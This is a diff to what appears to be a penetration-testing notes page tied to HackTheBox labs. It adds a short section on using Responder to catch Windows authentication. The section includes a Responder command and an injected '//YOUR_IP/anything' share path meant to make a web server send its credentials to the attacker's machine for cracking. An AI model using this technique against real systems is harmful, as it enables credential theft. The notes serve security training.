@@ -21,3 +21,28 @@ For instance, we can use API Testing Platforms:
 * [ngrok](https://ngrok.com/)
 * ...
 </div></div>
+
+<hr class="sep-both">
+
+## Additional tools
+
+<div class="row row-cols-lg-2"><div>
+
+#### Responder
+
+[![attacking_common_services](../../../_badges/htb/attacking_common_services.svg)](https://academy.hackthebox.com/course/preview/attacking-common-services)
+[![return](../../../_badges/htb-p/return.svg)](https://app.hackthebox.com/machines/Return)
+
+You can use [responder](https://github.com/lgandx/Responder) to catch Windows authentication requests.
+
+For instance, a website may be using SMB to access some shares based on the user input. If we inject a share leading to our machine, we may be able to grab credentials.
+
+```ps
+$ sudo responder -i IP -I tun0
+```
+
+In the previous example, if we inject `//YOUR_IP/anything`. If the website was configured to use the current user credentials to connect to the share, then you will receive them, and will have to crack them.
+
+📚 It works with SMB, LDAP, etc.
+</div><div>
+</div></div>
